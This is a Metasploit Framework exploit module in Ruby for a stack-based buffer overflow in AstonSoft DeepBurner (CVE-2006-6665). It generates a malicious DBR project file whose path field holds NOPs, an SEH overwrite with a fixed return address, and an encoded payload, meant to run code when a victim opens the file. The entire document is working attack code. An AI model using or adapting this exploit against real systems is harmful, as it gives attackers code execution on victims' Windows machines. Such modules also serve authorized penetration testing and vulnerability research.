##
# $Id: deepburner_path.rb 8361 2010-02-03 06:09:31Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'AstonSoft DeepBurner (DBR File) Path Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in versions 1.9.0.228, 
				1.8.0, and possibly other versions of AstonSoft's DeepBurner (Pro, Lite, etc).
				An attacker must send the file to victim and the victim must open the file.
				Alternatively it may be possible to execute code remotely via an embedded
				DBR file within a browser, since the DBR extention is registered to DeepBurner.
			},
			'License'        => MSF_LICENSE,
			'Author' 	 =>
				[
					'Expanders',  # original discovery (2006)
					'fl0 fl0w',   # re-discovered 2009/2010
					'jduck'       # metasploit version
				],
			'Version'        => '$Revision: 8361 $',
			'References'     =>
				[
					[ 'BID', '21657' ],
					[ 'OSVDB', '32356' ],
					[ 'CVE', '2006-6665' ],
					[ 'URL', 'http://milw0rm.com/exploits/2950' ],
					[ 'URL', 'http://milw0rm.com/exploits/8335' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/11315' ]
				],
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
					'DisableNops' => true
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Windows Universal', { 'Ret' => 0x101021f8 } ], # p/p/r - basswma.dll v2.2.0.3 (seems to be packed)
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Dec 19 2006',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.dbr']),
			], self.class)
	end

	def exploit

		template = %Q|<DeepBurner_record ver="1.9.0.228" type="data">
    <data_cd ver="1" device="" session2import="0" finalize_disc="0" finalize_track="1" bootable="0" boot_image_path="">
        <dir name="CDRoot" imp="0">
            <file name="map_fear_drives.bat" path="REPLACE_ME" imp="0" />
        </dir>
    </data_cd>
    <cd_label ver="1" zoom="0" view="label" layout="standart">
        <label />
        <front />
        <back />
    </cd_label>
    <autorun ver="1" use="0">
        <main name="MainForm" image_path="" hint="" />
        <title name="Title" text="Title" hint="Title box" left="144" top="48" width="57" height="33" fontname="Times New Roman" fontsize="20" fontcolor="255" visible="1" fontstyle="0" />
        <comment name="Comments" text="Comment" hint="Comment box" left="40" top="76" width="89" height="29" fontname="Times New Roman" fontsize="15" fontcolor="255" visible="1" fontstyle="0" />
        <exitbutton name="ButtonExit" image_path="" image_down_path="" text="Exit" hint="Exit this program" left="120" top="96" width="75" height="25" fontname="MS Sans Serif" fontsize="8" fontcolor="255" visible="1" fontstyle="0" />
    </autorun>
</DeepBurner_record>
|

		seh_offset = 272
		path = make_nops(seh_offset)
		path << generate_seh_record(target.ret)
		path << payload.encoded
		path << rand_text_alphanumeric(1000) * 20
		path = xml_encode(path)

		sploit = template.gsub(/REPLACE_ME/, path)

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(sploit)

	end

   def xml_encode(str)
		ret = ""
		str.unpack('C*').each { |ch|
			case ch
			when 0x41..0x5a, 0x61..0x7a, 0x30..0x39
				ret << ch.chr
			else
				ret << "&#x"
				ret << ch.chr.unpack('H*')[0]
				ret << ";"
			end
		}
		ret
	end

end
